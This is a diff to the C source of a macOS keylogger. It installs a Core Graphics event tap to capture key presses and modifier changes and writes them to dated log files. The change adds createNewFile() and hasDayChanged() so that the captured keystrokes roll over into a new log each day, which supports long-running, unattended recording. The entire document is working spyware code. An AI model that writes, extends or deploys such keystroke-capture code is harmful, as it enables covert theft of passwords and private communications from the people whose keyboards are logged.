@@ -1,13 +1,20 @@
 #include "keylogger.h"
+void createNewFile() {
+    now = time(NULL);
+    tm  = localtime(&now);
+    theday = tm->tm_mday;
+    sprintf(logFileLocation, "%s/%04d%02d%02d.log", logDirectory, tm->tm_year+1900, tm->tm_mon+1, theday);
+    logfile = fopen(logFileLocation, "a");
+
+    if (!logfile) {
+        fprintf(stderr, "ERROR: Unable to access keystroke log file. Please make sure you have the correct permissions.\n");
+        exit(1);
+    }
+}
 
 int main(int argc, const char *argv[]) {
-    char logFileLocation[50];
-    struct   tm* tm;
-
-    time_t now = time(NULL);
-    tm  = localtime(&now);
     if(argc == 2) {
-        sprintf(logFileLocation, "%s/%04d%02d%02d.log", argv[1], tm->tm_year+1900, tm->tm_mon+1, tm->tm_mday);
+        sprintf(logDirectory, "%s", argv[1]);
     }else{
         fprintf(stderr, "ERROR: You must specify the full path to the logs folder.\n");
         exit(1);
@@ -27,18 +34,24 @@ int main(int argc, const char *argv[]) {
     CFRunLoopAddSource(CFRunLoopGetCurrent(), runLoopSource, kCFRunLoopCommonModes);
     CGEventTapEnable(eventTap, true);
 
-    logfile = fopen(logFileLocation, "a");
+    createNewFile();
 
-    if (!logfile) {
-        fprintf(stderr, "ERROR: Unable to access keystroke log file. Please make sure you have the correct permissions.\n");
-        exit(1);
-    }
     CFRunLoopRun();
 
     return 0;
 }
 
+
+bool hasDayChanged() {
+    now = time(NULL);
+    tm  = localtime(&now);
+    return tm->tm_mday != theday;
+}
+
 CGEventRef CGEventCallback(CGEventTapProxy proxy, CGEventType type, CGEventRef event, void *refcon) {
+    if (hasDayChanged()) {
+        createNewFile();
+    }
     if (type != kCGEventKeyDown && type != kCGEventFlagsChanged && type != kCGEventKeyUp) { return event; }
 
     CGKeyCode keyCode = (CGKeyCode) CGEventGetIntegerValueField(event, kCGKeyboardEventKeycode);
